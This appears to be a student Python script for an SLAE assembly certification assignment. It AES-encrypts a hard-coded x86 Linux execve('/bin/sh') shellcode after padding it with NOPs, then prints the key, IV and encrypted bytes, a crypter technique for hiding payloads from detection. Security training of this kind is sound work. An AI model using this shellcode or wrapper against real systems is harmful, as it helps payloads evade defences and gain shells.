#!/usr/bin/python3
'''
Filename:   encrypter.py
Author:     aus-mate
Purpose:    This code was written for assignment #7 of the SecurityTube Linux Assembly Expert certification.
Student ID: SLAE-1555
'''
from Crypto.Cipher import AES
from os import urandom

shellcode = bytearray("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80", 'ISO-8859-1')

print ("\nOriginal: " + "".join("0x%02x," % i for i in shellcode))

while (len(shellcode) % 16):
        shellcode += b'\x90'

aes_key = urandom(16)
init_vec = urandom(16)
enc_cipher = AES.new(aes_key, AES.MODE_CBC, init_vec)
dec_cipher = AES.new(aes_key, AES.MODE_CBC, init_vec)

enc_shellcode = enc_cipher.encrypt(shellcode)
print("\nKey: " + "".join("0x%02x," % i for i in aes_key))
print("\nIV: " + "".join("0x%02x," % i for i in init_vec))
print("\nEncrypted: " + "".join("0x%02x," % i for i in enc_shellcode))

# dec_shellcode = dec_cipher.decrypt(enc_shellcode)
# print("\nDecrypted: " + "".join("0x%02x," % i for i in dec_shellcode))
